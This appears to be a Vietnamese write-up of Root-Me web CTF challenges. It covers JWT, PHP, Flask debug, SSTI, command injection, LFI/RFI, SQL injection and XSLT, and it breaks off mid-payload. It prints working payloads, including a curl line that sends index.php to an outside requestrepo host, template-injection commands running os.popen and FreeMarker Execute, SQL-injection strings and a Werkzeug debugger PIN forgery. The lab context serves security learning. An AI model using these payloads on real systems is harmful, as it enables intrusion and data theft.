#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from flask import Flask, request, jsonify
from flask_jwt_extended import JWTManager, jwt_required, create_access_token, decode_token
import datetime
#from apscheduler.schedulers.background import BackgroundScheduler
import threading
import jwt
from config import *
 
# Setup flask
app = Flask(__name__)
 
app.config['JWT_SECRET_KEY'] = SECRET
jwtmanager = JWTManager(app)
blacklist = set()
lock = threading.Lock()
 
# Free memory from expired tokens, as they are no longer useful
def delete_expired_tokens():
    with lock:
        to_remove = set()
        global blacklist
        for access_token in blacklist:
            try:
                jwt.decode(access_token, app.config['JWT_SECRET_KEY'],algorithm='HS256')
            except:
                to_remove.add(access_token)
       
        blacklist = blacklist.difference(to_remove)
 
@app.route("/web-serveur/ch63/")
def index():
    return "POST : /web-serveur/ch63/login <br>\nGET : /web-serveur/ch63/admin"
 
# Standard login endpoint
@app.route('/web-serveur/ch63/login', methods=['POST'])
def login():
    try:
        username = request.json.get('username', None)
        password = request.json.get('password', None)
    except:
        return jsonify({"msg":"""Bad request. Submit your login / pass as {"username":"admin","password":"admin"}"""}), 400
 
    if username != 'admin' or password != 'admin':
        return jsonify({"msg": "Bad username or password"}), 401
 
    access_token = create_access_token(identity=username,expires_delta=datetime.timedelta(minutes=3))
    ret = {
        'access_token': access_token,
    }
   
    with lock:
        blacklist.add(access_token)
 
    return jsonify(ret), 200
 
# Standard admin endpoint
@app.route('/web-serveur/ch63/admin', methods=['GET'])
@jwt_required
def protected():
    access_token = request.headers.get("Authorization").split()[1]
    with lock:
        if access_token in blacklist:
            return jsonify({"msg":"Token is revoked"})
        else:
            return jsonify({'Congratzzzz!!!_flag:': FLAG})
 
 
if __name__ == '__main__':
    scheduler = BackgroundScheduler()
    job = scheduler.add_job(delete_expired_tokens, 'interval', seconds=10)
    scheduler.start()
    app.run(debug=False, host='0.0.0.0', port=5000)
```

![image](https://hackmd.io/_uploads/rkx89Q6Jkx.png)

![image](https://hackmd.io/_uploads/SJYU97ay1l.png)

vì nếu đăng nhập với người dùng thì sẽ tạo ra 1 token và đưa token đó vào trong black-list, do nếu token trong black-list sẽ in ra revoke nên ta sẽ dùng `Thủ thuật 2: RFC 4648` khi thêm các kí tự ngoài bằng ascii 2 sẽ bị bỏ qua 

![image](https://hackmd.io/_uploads/S1lxjXTJJl.png)

![image](https://hackmd.io/_uploads/B18bimpkyx.png)

![image](https://hackmd.io/_uploads/BJtQjQTy1x.png)

nó chỉ cảnh báo chứ không lỗi

flag: `Do_n0t_r3v0ke_3nc0d3dTokenz_Mam3ne-Us3_th3_JTI_f1eld`

## JWT - Weak secret

như tên thì key yếu thì brute thôi

![image](https://hackmd.io/_uploads/SJH80QTkJx.png)

![image](https://hackmd.io/_uploads/HkMFC7p1Je.png)

https://blog.intigriti.com/hacking-tools/hacker-tools-jwt-tool

![image](https://hackmd.io/_uploads/rJt1yET11x.png)

secret key là lol 

![image](https://hackmd.io/_uploads/HJ5BkETy1l.png)

![image](https://hackmd.io/_uploads/ryE91Np1Jx.png)

flag: `PleaseUseAStrongSecretNextTime`

## JWT - Unsecure File Signature

![image](https://hackmd.io/_uploads/BJM1eN6kyx.png)

![image](https://hackmd.io/_uploads/r1NkBVakyl.png)

đây là kĩ thuật tấn công via kid header - secret sẽ được lấy ở tên file trong kid ta sẽ trỏ nó đến dev/null để secret key là null, do ở đây có filter nên ta bypass path traversal, điều kiện thứ 2 là phần signature sẽ trả ra null, do đó ta dùng ``AA==``

![image](https://hackmd.io/_uploads/B1MRVEpJ1e.png)

flag: `RM{Uns3cUr3_f1l3_H4ndl1nG!!}`

## PHP - assert()

![image](https://hackmd.io/_uploads/SyNirV6kye.png)

bài này assert dính rce nên mình sẽ làm luôn

https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp#rce-via-assert

![image](https://hackmd.io/_uploads/H1-G8EpJkg.png)

![image](https://hackmd.io/_uploads/ryD4U4Tkye.png)

![image](https://hackmd.io/_uploads/H1oBL4TkJg.png)

flag: `x4Ss3rT1nglSn0ts4f3A7A1Lx`

## PHP - Apache configuration

![image](https://hackmd.io/_uploads/S1d5LVTJke.png)

cho phép upload tất cả các loại file trừ php

![image](https://hackmd.io/_uploads/By0a8N61ye.png)

ta thấy hint `.htaccess` mình nghĩ ngay đến upload .htaccess để cho phép 1 file được thực thi như php

![image](https://hackmd.io/_uploads/SkUAKNayyx.png)

```
Options All +Indexes

<IfModule mod_php7.c>
    php_flag engine on
</IfModule>

<FilesMatch "pwn">
  SetHandler  application/x-httpd-php
</FilesMatch>
```

![image](https://hackmd.io/_uploads/B1Ke5Ea1yx.png)

![image](https://hackmd.io/_uploads/B1XbcEa1Jl.png)

flag: `ht@cc3ss2RCE4th%w1n`

## PHP - Filters

![image](https://hackmd.io/_uploads/Skzu946kJl.png)

trông có vẻ khá sú

![image](https://hackmd.io/_uploads/r1FsjV6kJg.png)

nghĩ ngay đến lfi thử ngay:

![image](https://hackmd.io/_uploads/SkETjNaJ1e.png)

![image](https://hackmd.io/_uploads/HJvAoNp1yx.png)

thấy passwd nằm ở file config

![image](https://hackmd.io/_uploads/Hk0k3ET1kl.png)

![image](https://hackmd.io/_uploads/HkOenNpyyx.png)

pass admin: `DAPt9D2mky0APAF`

![image](https://hackmd.io/_uploads/H1fM34TJJe.png)

flag: `DAPt9D2mky0APAF`

## PHP - register globals

![image](https://hackmd.io/_uploads/H12d3ETk1x.png)

![image](https://hackmd.io/_uploads/H1E93E6yke.png)

không thấy có manh mối gì thử scan

![image](https://hackmd.io/_uploads/ByqX64pJJx.png)

mình thử nhập tay để tìm file backup thì được luôn vì hint là backup

không thì scan cũng ra

![image](https://hackmd.io/_uploads/rJN8TVpyye.png)


```
<?php

function auth($password, $hidden_password){
    $res=0;
    if (isset($password) && $password!=""){
        if ( $password == $hidden_password ){
            $res=1;
        }
    }
    $_SESSION["logged"]=$res;
    return $res;
}


function display($res){
    $aff= '
	  <html>
	  <head>
	  </head>
	  <body>
	    <h1>Authentication v 0.05</h1>
	    <form action="" method="POST">
	      Password&nbsp;<br/>
	      <input type="password" name="password" /><br/><br/>
	      <br/><br/>
	      <input type="submit" value="connect" /><br/><br/>
	    </form>
	    <h3>'.htmlentities($res).'</h3>
	  </body>
	  </html>';
    return $aff;
}



session_start();
if ( ! isset($_SESSION["logged"]) )
    $_SESSION["logged"]=0;

$aff="";
include("config.inc.php");

if (isset($_POST["password"]))
    $password = $_POST["password"];

if (!ini_get('register_globals')) {
    $superglobals = array($_SERVER, $_ENV,$_FILES, $_COOKIE, $_POST, $_GET);
    if (isset($_SESSION)) {
        array_unshift($superglobals, $_SESSION);
    }
    foreach ($superglobals as $superglobal) {
        extract($superglobal, 0 );
    }
}

if (( isset ($password) && $password!="" && auth($password,$hidden_password)==1) || (is_array($_SESSION) && $_SESSION["logged"]==1 ) ){
    $aff=display("well done, you can validate with the password : $hidden_password");
} else {
    $aff=display("try again");
}

echo $aff;

?>

```

ta có thể thấy ở đây khi khởi tạo session thì kiếm tra logged trong session có tồn tại không , nếu chưa thù khởi tạo là 0.

kiểm tra pass word nếu có thì gán vào biến, khởi tạo các biến superglobals nếu chưa tồn tại `ini_get('register_globals')` khởi tạo một mảng với các biến.

Kiểm tra password nếu đúng thì password là flag, nếu sai thì not allow

https://security.stackexchange.com/questions/49375/possible-ways-of-exploiting-php-register-globals

searching register_global 

https://stackoverflow.com/questions/21368051/register-globals-exploit-session-array

![image](https://hackmd.io/_uploads/Hkxs_-AJJx.png)

![image](https://hackmd.io/_uploads/rkMxYbCy1g.png)


flag: `NoTQYipcRKkgrqG`

## PHP - Remote Xdebug

![image](https://hackmd.io/_uploads/r1V7tZAyJe.png)

qúa quen thuộc với x-debug rồi nên ta sẽ vào khai thác.


https://github.com/vulhub/vulhub/blob/master/php/xdebug-rce/exp.py

https://blog.csdn.net/qq_43645782/article/details/107040426

https://blog.csdn.net/weixin_43416469/article/details/114143522


## Python - Server-side Template Injection Introduction

![image](https://hackmd.io/_uploads/HywZrQCkJl.png)

![image](https://hackmd.io/_uploads/H1HvB7R1yl.png)

fuzz chút thì nó là Jinja2

`{{ cycler.__init__.__globals__.os.popen('id').read() }}`

![image](https://hackmd.io/_uploads/SkP9w7R11e.png)

flag: `Python_SST1_1s_co0l_4nd_mY_p4yl04ds_4r3_1ns4n3!!!`


## File upload - ZIP

![image](https://hackmd.io/_uploads/SkmHdQRykl.png)

![image](https://hackmd.io/_uploads/SycxK70kkx.png)

cho phép bạn upload một file zip và giải nén nó

![image](https://hackmd.io/_uploads/HknGK7C11g.png)

thử upload zip chưa file php nhưng bị cấm rồi

![image](https://hackmd.io/_uploads/Sk58Y7AJye.png)

quan sát ở đây mình có ý tưởng là upload 1 file symlink đến file index.php 

```
l3mnt2010@ASUSEXPERTBOOK:~/rootme/hihi/hiha/hiho$ ln -s ../../../index.php a.txt
l3mnt2010@ASUSEXPERTBOOK:~/rootme/hihi/hiha/hiho$ zip --symlinks a.zip a.
a.php  a.txt  a.zip
l3mnt2010@ASUSEXPERTBOOK:~/rootme/hihi/hiha/hiho$ zip --symlinks a.zip a.txt
  adding: a.txt (stored 0%)
l3mnt2010@ASUSEXPERTBOOK:~/rootme/hihi/hiha/hiho$
```

nhớ thêm ``--symlinks`` hoặc `-y` không là nó sẽ hiển thị file tại hệ thống của bạn đấy

![image](https://hackmd.io/_uploads/Hk7IWEA1Jx.png)


flag: `N3v3r_7rU5T_u5Er_1npU7`

## Flask - Development server

![image](https://hackmd.io/_uploads/BynAZN011e.png)


web giống với bài nào ở trên đó mình không nhớ rõ thêm chức năng search bị dính lỗi read file

![image](https://hackmd.io/_uploads/HJLAz4Cyye.png)

![image](https://hackmd.io/_uploads/r1d9QNRkyx.png)

mình mò ra theo dec đề bài

```
#!/usr/bin/env python3

from flask import Flask, request, render_template, abort

app = Flask(__name__, static_folder='static')

@app.route("/", methods=["GET"])
def index():
    return render_template("index.html")

@app.route("/services", methods=["GET"])
def services():
    template_name = "wip"  # Default template name
    if "search" in request.args:
        template_name = request.args.get("search")
    
    try:
        # Ensure the template exists and is safe to read
        with open(template_name) as f:
            template_content = f.read()
    except FileNotFoundError:
        # Return 404 if the template file doesn't exist
        abort(404)
    except Exception as e:
        # Return internal server error for other exceptions
        return f"An error occurred: {e}", 500

    return render_template("services.html", template=template_content)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080, debug=True)

```

![image](https://hackmd.io/_uploads/HJRCEVAyyg.png)

chưa thấy có manh mối gì


```
12:perf_event:/
11:cpu,cpuacct:/user.slice
10:memory:/user.slice/user-1045.slice/user@1045.service
9:freezer:/
8:devices:/user.slice
7:rdma:/
6:hugetlb:/
5:blkio:/user.slice
4:cpuset:/
3:pids:/user.slice/user-1045.slice/user@1045.service
2:net_cls,net_prio:/
1:name=systemd:/user.slice/user-1045.slice/user@1045.service/docker-rootless.service/4acf855fca20f182bc577aa61dadfc30acbcda83c9996839c18000c5292347d7
0::/user.slice/user-1045.slice/user@1045.service/docker-rootless.service
```

`a50e2df9-73cb-4207-980a-15fab2109534`

`02:42:ac:11:00:22`

```
l3mnt2010@ASUSEXPERTBOOK:~/rootme$ python3 FlaskDEBUGRCE.py --username web-app --path '/home/web-app/.local/lib/python3.11/site-packages/flask/app.py' --mac '02:42:ac:11:00:22' --cgroup '12:perf_event:/' --machine_id 'a50e2df9-73cb-4207-980a-15fab2109534' --modname flask.app --appname Flask



                        ¶         ¶
                         ¶         ¶
                     ¶   ¶         ¶   ¶
                     ¶  ¶¶         ¶¶  ¶
                     ¶¶ ¶¶¶       ¶¶¶ ¶¶
             ¶      ¶¶   ¶¶¶     ¶¶¶   ¶¶      ¶
            ¶¶      ¶¶   ¶¶¶     ¶¶¶   ¶¶      ¶¶
           ¶¶      ¶¶    ¶¶¶¶   ¶¶¶¶    ¶¶      ¶¶
           ¶¶     ¶¶¶    ¶¶¶¶  ¶¶¶¶¶    ¶¶¶     ¶¶¶
       ¶  ¶¶¶    ¶¶¶¶    ¶¶¶¶   ¶¶¶¶    ¶¶¶¶   ¶¶¶¶  ¶
       ¶¶ ¶¶¶¶¶  ¶¶¶¶   ¶¶¶¶¶   ¶¶¶¶¶   ¶¶¶¶  ¶¶¶¶¶ ¶¶
       ¶¶ ¶¶¶¶¶  ¶¶¶¶¶¶¶¶¶¶¶     ¶¶¶¶¶¶¶¶¶¶¶  ¶¶¶¶¶ ¶¶
       ¶¶ ¶¶¶¶¶  ¶¶¶¶¶¶¶¶¶¶¶     ¶¶¶¶¶¶¶¶¶¶¶  ¶¶¶¶¶ ¶¶
      ¶¶¶  ¶¶¶¶   ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶   ¶¶¶¶  ¶¶¶
     ¶¶¶¶  ¶¶¶¶   ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶   ¶¶¶¶  ¶¶¶¶
    ¶¶¶¶   ¶¶¶¶¶ ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶ ¶¶¶¶¶   ¶¶¶¶
   ¶¶¶¶    ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶   ¶¶¶¶
   ¶¶¶¶¶  ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶  ¶¶¶¶
    ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
    ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
     ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
     ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
      ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
     ¶¶¶¶¶           ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶           ¶¶¶¶¶
     ¶¶¶¶¶¶             ¶¶¶¶¶¶¶¶¶¶¶¶¶             ¶¶¶¶¶¶
      ¶¶¶¶¶¶¶        ..     ¶¶¶¶¶¶¶¶¶     ..        ¶¶¶¶¶¶
       ¶¶¶¶¶¶¶¶             ¶¶¶¶¶             ¶¶¶¶¶¶¶¶
        ¶¶¶¶¶¶¶¶¶¶           ¶¶¶           ¶¶¶¶¶¶¶¶¶¶
           ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
              ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶   ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
                  ¶¶¶¶¶¶¶¶¶¶     ¶¶¶¶¶¶¶¶¶¶
                   ¶¶¶¶¶¶¶¶       ¶¶¶¶¶¶¶¶
                  ¶¶¶¶¶¶¶¶¶       ¶¶¶¶¶¶¶¶¶
                  ¶¶¶¶¶¶¶¶¶ ¶¶¶¶¶ ¶¶¶¶¶¶¶¶¶
                 ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
                 ¶¶¶  ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶  ¶¶¶
                  ¶¶  ¶¶¶¶  ¶¶¶¶¶  ¶¶¶¶  ¶¶
                      ¶¶¶¶  ¶¶¶¶¶  ¶¶¶¶



__          __             _
\ \        / /            | |
 \ \  /\  / /   ___  _ __ | | __ ____  ___  _   _   __ _   ___  _ __
  \ \/  \/ /   / _ \| '__|| |/ /|_  / / _ \| | | | / _` | / _ \| '__|
   \  /\  /   |  __/| |   |   <  / / |  __/| |_| || (_| ||  __/| |
    \/  \/     \___||_|   |_|\_\/___| \___| \__,_| \__, | \___||_|
                                                    __/ |
                                                   |___/


                Author:  https://github.com/SidneyJob
                Channel: https://t.me/SidneyJobChannel

[+] Success!
[*] PIN: 204-041-067
[*] Cookie: __wzdf44644a375dc3af0ac50=1729150319|2de21132d145
[*] Modname: flask.app
[*] Appname: wsgi_app

[+] Success!
[*] PIN: 268-308-375
[*] Cookie: __wzda1d2b8ca47b14dbc0483=1729150319|072670b649b7
[*] Modname: flask.app
[*] Appname: DebuggedApplication

[+] Success!
[*] PIN: 143-326-594
[*] Cookie: __wzd5097cc3d00d7045ae30e=1729150319|689a7a03b3d9
[*] Modname: flask.app
[*] Appname: Flask

[+] Success!
[*] PIN: 143-326-594
[*] Cookie: __wzd5097cc3d00d7045ae30e=1729150319|689a7a03b3d9
[*] Modname: flask.app
[*] Appname: Flask

[+] Success!
[*] PIN: 111-600-901
[*] Cookie: __wzd1e28508e01e7cc6bda9e=1729150319|a5e8cfd2a0c7
[*] Modname: werkzeug.debug
[*] Appname: wsgi_app

[+] Success!
[*] PIN: 572-381-524
[*] Cookie: __wzd154c11ebc8c181c13d98=1729150319|c6ea2c131b2c
[*] Modname: werkzeug.debug
[*] Appname: DebuggedApplication

[+] Success!
[*] PIN: 842-001-700
[*] Cookie: __wzdf34554bd0c2d71fb755e=1729150319|107a4a6e663a
[*] Modname: werkzeug.debug
[*] Appname: Flask

[+] Success!
[*] PIN: 842-001-700
[*] Cookie: __wzdf34554bd0c2d71fb755e=1729150319|107a4a6e663a
[*] Modname: werkzeug.debug
[*] Appname: Flask

[+] Success!
[*] PIN: 204-041-067
[*] Cookie: __wzdf44644a375dc3af0ac50=1729150319|2de21132d145
[*] Modname: flask.app
[*] Appname: wsgi_app

[+] Success!
[*] PIN: 268-308-375
[*] Cookie: __wzda1d2b8ca47b14dbc0483=1729150319|072670b649b7
[*] Modname: flask.app
[*] Appname: DebuggedApplication

[+] Success!
[*] PIN: 143-326-594
[*] Cookie: __wzd5097cc3d00d7045ae30e=1729150319|689a7a03b3d9
[*] Modname: flask.app
[*] Appname: Flask

[+] Success!
[*] PIN: 143-326-594
[*] Cookie: __wzd5097cc3d00d7045ae30e=1729150319|689a7a03b3d9
[*] Modname: flask.app
[*] Appname: Flask

[+] 12 payloads are successfully generated!
l3mnt2010@ASUSEXPERTBOOK:~/rootme$
```

may mắn searching một hồi về debug via path traversal mình tìm được 1 bài 

https://hackmd.io/@CP04042K/BkFYA8P0j#Path-traversal-save-the-day

`GET /services?search=/proc/sys/kernel/random/boot_id`

![image](https://hackmd.io/_uploads/rywrbSAJye.png)

`GET /services?search=/home/web-app/.local/lib/python3.11/site-packages/flask/app.py`

![image](https://hackmd.io/_uploads/rJaUbBCyke.png)

`GET /services?search=/proc/self/cgroup`

![image](https://hackmd.io/_uploads/BJ6w-BA1kx.png)

`GET /services?search=/sys/class/net/eth0/address HTTP/1.1` để lấy địa chỉ MAC

![image](https://hackmd.io/_uploads/H1910E0k1x.png)

![image](https://hackmd.io/_uploads/S1HlerA1Je.png)

![image](https://hackmd.io/_uploads/HkOlWSC1ye.png)

`__import__("os").popen('cat *').read()`

![image](https://hackmd.io/_uploads/HkE7WSAkke.png)


flag: `RM{B3_C4refull_w1th_fl4sk_d3bug}`

## GraphQL - Injection

## Command injection - Filter bypass

dec: Find a vulnerability in this service and exploit it. Some protections were added.

![image](https://hackmd.io/_uploads/Sy5GaB01kg.png)

ta dùng list để check có khá nhiều cái qua được

`ip=127.0.0.1%0Acurl%20-F%20"file=@index.php"%20http://00br69e7.requestrepo.com`

![image](https://hackmd.io/_uploads/HkIHaH0k1e.png)

![image](https://hackmd.io/_uploads/HkKIprA1Jl.png)

```
<html>
<head>
<title>Ping Service</title>
</head>
<body>
<form method="POST" action="index.php">
<input type="text" name="ip" placeholder="127.0.0.1">
<input type="submit">
</form>
<pre>
<?php
$flag = "".file_get_contents(".passwd")."";

if(isset($_POST["ip"]) && !empty($_POST["ip"])){
$ip = @preg_replace("/[\\\$|`;&<>]/", "", $_POST["ip"]);
//$ip = @str_replace(['\\', '$', '|', '`', ';', '&', '<', '>'], "", $_POST["ip"]);
$response = @shell_exec("timeout 5 bash -c 'ping -c 3 ".$ip."'");
$receive = @preg_match("/3 packets transmitted, (.*) received/s",$response,$out);

if ($out[1]=="3")
{
echo "Ping OK";
}
elseif ($out[1]=="0")
{
echo "Ping NOK";
}
else
{
echo "Syntax Error";
}
}
?>
</pre>
</body>
</html>
```

![image](https://hackmd.io/_uploads/r1LYpS0yJx.png)

flag: `Comma@nd_1nJec7ion_Fl@9_1337_Th3_G@m3!!!`

## Java - Server-side Template Injection

![image](https://hackmd.io/_uploads/B1SCprCkkg.png)

![image](https://hackmd.io/_uploads/H1bxRHR1ye.png)

![image](https://hackmd.io/_uploads/ByvMRSRyyl.png)

thử cái được luôn

![image](https://hackmd.io/_uploads/Sy2_1U0Jyl.png)

nó là free maker của java

https://portswigger.net/research/server-side-template-injection

`nickname=<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("cat SECRET_FLAG.txt") }`

![image](https://hackmd.io/_uploads/HkeF3yU0J1l.png)

flag: `B3wareOfT3mplat3Inj3ction`

## JWT - Public key

## JWT - Header Injection

## Local File Inclusion

![image](https://hackmd.io/_uploads/rykVgLCkJl.png)

![image](https://hackmd.io/_uploads/H1JH-U0J1e.png)

ta để ý có phần admin nhưng phải nhập pass

ta lfi để xem file trong /admin thì được luôn

![image](https://hackmd.io/_uploads/rybtWUC1Jx.png)

![image](https://hackmd.io/_uploads/HkN_W8RJ1g.png)

flag: `OpbNJ60xYpvAQU8`

## Local File Inclusion - Double encoding

như cái tên của nó thì ta start chall luôn

yêu cầu : `Find the validation password in the source files of the website.`

![image](https://hackmd.io/_uploads/rktFGICJJe.png)

quan sát có thể thấy chương trình dùng include và có thêm đuôi `.inc.php` ở sau ban đầu mình nghĩ là tên nó khác đuôi .inc.php nên dùng được %00 để loại bỏ đoạn đằng sau

![image](https://hackmd.io/_uploads/SJwLSUC1kl.png)

nhưng mà bài này mình đọc dữ liệu trước -> cơ bản thì nó có 2 page contact và cv

![image](https://hackmd.io/_uploads/B1r2S8AyJl.png)

ở đây ta thấy có file conf.inc.php

![image](https://hackmd.io/_uploads/r188LU0kkl.png)

![image](https://hackmd.io/_uploads/H1hD8IAkkg.png)

flag: `Th1sIsTh3Fl4g!`

## Node - Eval

dec: `Evode Bank is a new generation online bank. This bank has created an online tool to attract new customers. Use this tool and find a way to read the file containing the flag!`

![image](https://hackmd.io/_uploads/H19pLL0yJl.png)

chức năng tính toán chi tiêu

![image](https://hackmd.io/_uploads/SJlYJDUAJJe.png)

server chạy với nodejs express

![image](https://hackmd.io/_uploads/HyonvU0J1x.png)

với đề bài là eval thì mình thử 1 chút được như sau

![image](https://hackmd.io/_uploads/BkV0wUCyJl.png)

rev shell hình như không được:

![image](https://hackmd.io/_uploads/HJnPuURy1l.png)

![image](https://hackmd.io/_uploads/Hk9idLCkyx.png)

![image](https://hackmd.io/_uploads/B1oyYIRk1g.png)

![image](https://hackmd.io/_uploads/BJQWt8RJke.png)

https://github.com/aadityapurani/NodeJS-Red-Team-Cheat-Sheet

flag: `D0n0tTru5tEv0d3B4nK!`

## PHP - Loose Comparison

như lỗi thì ta đi vào chall luôn

![image](https://hackmd.io/_uploads/BkPONIygJg.png)

![image](https://hackmd.io/_uploads/B1udNIylkg.png)

đối với dạng lỗ hổng như này là phổ biến ở php như ta thấy ta control được s, h

```
<?php
function gen_secured_random() { // cause random is the way
    $a = rand(1337,2600)*42;
    $b = rand(1879,1955)*42;

    $a < $b ? $a ^= $b ^= $a ^= $b : $a = $b;

    return $a+$b;
}

function secured_hash_function($plain) { // cause md5 is the best hash ever
    $secured_plain = sanitize_user_input($plain);
    return md5($secured_plain);
}

function sanitize_user_input($input) { // cause someone told me to never trust user input
    $re = '/[^a-zA-Z0-9]/';
    $secured_input = preg_replace($re, "", $input);
    return $secured_input;
}

if (isset($_GET['source'])) {
    show_source(__FILE__);
    die();
}


require_once "secret.php";

if (isset($_POST['s']) && isset($_POST['h'])) {
    $s = sanitize_user_input($_POST['s']);
    $h = secured_hash_function($_POST['h']);
    $r = gen_secured_random();
    if($s != false && $h != false) {
        if($s.$r == $h) {
            print "Well done! Here is your flag: ".$flag;
        }
        else {
            print "Fail...";
        }
    }
    else {
        print "<p>Hum ...</p>";
    }
}
?>
```

Yêu cầu ``$s.$r == $h`` và `($s != false && $h != false)` thì ta sẽ nhận được flag

đối với php thì lỗi này là khá tiêu biểu:

bây giờ tra truyền s=0e***************** vì khi mà php xử lí sẽ nghĩ 0e là 0, tiếp theo sau đó, là giá trị của h được md5 vào, nên ta sẽ truyền giá trị sau cho sau khi md5 nó ra 0e******

Kết quả là 0.random == 0 vì kiểu so sánh lose compare trong php

flag: `F34R_Th3_L0o5e_C0mP4r15On`

## PHP - preg_replace()

yêu cầu là đọc file flag.php để nhận flag

![image](https://hackmd.io/_uploads/rkDu6Iklyx.png)

khi vào trong trang web ta sẽ có một form như trên, tác dụng là ta check regex nó sẽ replace những kí tự match với nó thành một kí tự content ta đưa vào -> có vẻ như ở đây dùng preg_replace và ngôn ngữ được dùng là php

https://captainnoob.medium.com/command-execution-preg-replace-php-function-exploit-62d6f746bda4


đây là bài viết giải thích khá chi tiết và đầy đủ về cách khai thác lỗi này

![image](https://hackmd.io/_uploads/ry1b0UJlJg.png)

![image](https://hackmd.io/_uploads/BkTZALkxkx.png)

`/?nic3=/W/e&bruh=eval('echo fi'.'le_get_contents("flag210d9f88fd1db71b947fbdce22871b57.php");');`

`/?nic3=/W/e&bruh=eval('echo implode(",",scand'.'ir("."));');`

https://ctftime.org/writeup/26087

![image](https://hackmd.io/_uploads/HJDzkD1gJx.png)

![image](https://hackmd.io/_uploads/H1OoJDke1e.png)

![image](https://hackmd.io/_uploads/By_2yPyl1g.png)

ta quan sát xem nó xử lí như thế nào

```
<?php
if(isset($_POST['search']) && isset($_POST['replace']) && isset($_POST['content'])) {

	$new = preg_replace($_POST['search'], $_POST['replace'], $_POST['content']);
	echo htmlentities($new);
}
?>
```

flag: `pr3g_r3pl4c3_3_m0d1f13r_styl3`


## PHP - type juggling

như tiêu đề thì mình sẽ không nói nhiều nữa

bài này khá là đơn giản

![image](https://hackmd.io/_uploads/SJOfMDkxJx.png)

https://www.doyler.net/security-not-included/bypassing-php-strcmp-abctf2016

`password[]=%22%22` nếu mà password là một mảng thì khi strcmp 1 array với 1 chuỗi thì trả ra true

![image](https://hackmd.io/_uploads/H1MNQvJxJg.png)

còn đối với username thì losse compare nên value là 0 thì bằng chuỗi

`{"data":{"login":0,"password":[]}}`

![image](https://hackmd.io/_uploads/Hka87PJeJx.png)

flag: `DontForgetPHPL00seComp4r1s0n`

## Remote File Inclusion

như tên có nó có trường allow url include được bật và tính năng này đã tắt mặc định từ php 5 trở lên nên hiếm khi ta có thể thấy lỗi này

![image](https://hackmd.io/_uploads/Byh8NDyxkl.png)

vào trang web ta thấy có chức năng chuyển đổi ngôn ngữ

thử thay đổi tên thì báo lỗi không not found

`include(có cái nịt_lang.php)` có thể thấy server dùng include để thực hiện chuyển đổi ngôn ngữ tùy theo từng trang mà nó include vào và bài này RFI nên mình làm rfi luôn

yêu cầu là `Get the PHP source code.`


![image](https://hackmd.io/_uploads/rksHDvJx1l.png)

ok ta sẽ host file php lưu ý là đuôi _lang.php nên để tên file là index_lang.php

![image](https://hackmd.io/_uploads/BkkiPPJekx.png)


flag: `R3m0t3_iS_r3aL1y_3v1l`


## SQL injection - Authentication

des: `Retrieve the administrator password`

như tên thì start chall

![image](https://hackmd.io/_uploads/BkWBuvygkg.png)


đơn giản thôi

![image](https://hackmd.io/_uploads/rknK_D1gkg.png)

flag: `TYsgv75zgtq`


## SQL injection - Authentication - GBK

![image](https://hackmd.io/_uploads/BJWPcvyxkg.png)

![image](https://hackmd.io/_uploads/H1E7XGbxke.png)

`login=admin%af'or 1=1 -- &password=abc`

![image](https://hackmd.io/_uploads/rydB7zbgJg.png)

flag: `iMDaFlag1337!`

## SQL injection - String

![image](https://hackmd.io/_uploads/By-nmzZe1l.png)

![image](https://hackmd.io/_uploads/rJNh6Gbxyx.png)

ở đây ta có thể thấy luôn bug sqli như đề


![image](https://hackmd.io/_uploads/SJBo-EZgke.png)

![image](https://hackmd.io/_uploads/rJKZ6EZlkx.png)

![image](https://hackmd.io/_uploads/SkEqTEblke.png)

flag: `c4K04dtIaJsuWdi`


## XSLT - Code execution

![image](https://hackmd.io/_uploads/H1nMAfZlJx.png)

![image](https://hackmd.io/_uploads/BkT-W4We1e.png)

Đề bài nói là file .passwd nằm trong 1 thư mục thì có vẻ là ở `.6ff3200bee785801f420fba826ffcdee`

```
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" >
<xsl:template match="/">
<xsl:value-of select="php:function('opendir','./')"/>
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
